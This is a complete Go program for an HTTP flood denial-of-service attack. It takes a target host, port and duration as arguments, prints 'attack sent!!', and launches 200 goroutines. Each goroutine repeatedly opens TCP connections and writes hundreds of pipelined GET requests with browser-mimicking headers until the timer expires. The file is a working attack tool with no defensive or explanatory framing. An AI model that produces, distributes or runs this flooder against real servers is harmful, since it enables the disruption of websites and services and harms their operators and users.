package main

import (
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var STOP bool

func main() {
	duration, _ := strconv.Atoi(os.Args[3])
	fmt.Println("--> attack sent!!")
	go timer(duration)
	for i := 0; i < 200; i++ {
		go RAWFLOOD(os.Args[1] + ":" + os.Args[2])
		time.Sleep(200 * time.Millisecond)
	}
	time.Sleep(time.Duration(duration) * time.Second)
}

func timer(duration int) {
	time.Sleep(time.Duration(duration) * time.Second)
	STOP = true
}

func RAWFLOOD(target string) {
	site, _ := url.Parse(target)
	path := strings.Replace(site.Path, ":"+strings.Split(target, ":")[2], "", -1)
	for {
	restart:
		if STOP == true {
			os.Exit(0)
		}
		conn, err := net.Dial("tcp", site.Host+":"+strings.Split(target, ":")[2])
		if err != nil {
			goto restart
		}
		defer conn.Close()
		for i := 0; i < 768; i++ {
			_, err = conn.Write([]byte("GET " + path + " HTTP/1.1\r\n" +
				"Host: " + site.Host + "\r\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n" +
				"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\r\n" +
				"Upgrade-Insecure-Requests: 1\r\n" +
				"Accept-Encoding: gzip, deflate, br\r\n" +
				"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n" +
				"Connection: Keep-Alive\r\n\r\n"))
		}
		if err != nil {
			goto restart
		}
	}
}
